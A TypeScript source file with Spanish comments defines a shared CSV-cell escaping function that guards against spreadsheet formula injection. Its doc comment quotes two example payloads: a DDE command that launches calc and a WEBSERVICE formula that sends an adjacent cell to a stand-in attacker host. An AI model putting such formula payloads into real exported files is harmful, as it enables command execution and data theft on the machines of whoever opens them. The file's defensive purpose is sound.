/**
 * La celda de un CSV, armada en UN solo lugar (#1170).
 *
 * ## Qué evita
 *
 * Un CSV que se abre en Excel con `=cmd|' /C calc'!A0` —o con
 * `=WEBSERVICE("https://evil.tld/?x="&B2)`, que se lleva la celda vecina al
 * servidor de quien lo escribió— es una inyección, no un dato. Encerrar el
 * valor entre comillas NO alcanza: Excel saca las comillas al importar y
 * evalúa el `=` igual. Lo único que lo para es un `'` adelante.
 *
 * ## Por qué vive en `core` y no al lado de cada exportador
 *
 * Esta regla existía desde #1076, escrita a mano dentro del paquete de
 * exportación del titular, y el otro armador de CSV del repo —la exportación
 * de contactos— nunca la recibió: doblaba las comillas y nada más. O sea que
 * la plataforma tenía la defensa puesta en un camino y abierta en el otro, con
 * el agravante de que desde #1170 el campo `nombre` de un contacto lo puede
 * escribir un desconocido mandando un WhatsApp. Dos copias de una regla de
 * seguridad son una regla aplicada y otra olvidada; la guarda de fuente
 * `packages/core/tests/csv-sin-copias.test.ts` exige que ningún armador de CSV
 * concatene sin pasar por acá.
 */
export function csvSeguro(valor: string): string {
  // Comillas, punto y coma, coma y saltos: todo lo que rompe una celda. Y el
  // `'` al principio de algo que parezca fórmula.
  const limpio = /^[=+\-@\t\r]/.test(valor) ? `'${valor}` : valor;
  return `"${limpio.replace(/"/g, '""')}"`;
}

/**
 * La misma celda, para los valores que no son texto. `null` y `undefined` van
 * vacíos; una fecha en ISO; un objeto en JSON.
 */
export function celdaCsv(valor: unknown): string {
  if (valor === null || valor === undefined) return '""';
  const texto =
    valor instanceof Date
      ? valor.toISOString()
      : typeof valor === 'object'
        ? JSON.stringify(valor)
        : String(valor);
  return csvSeguro(texto);
}
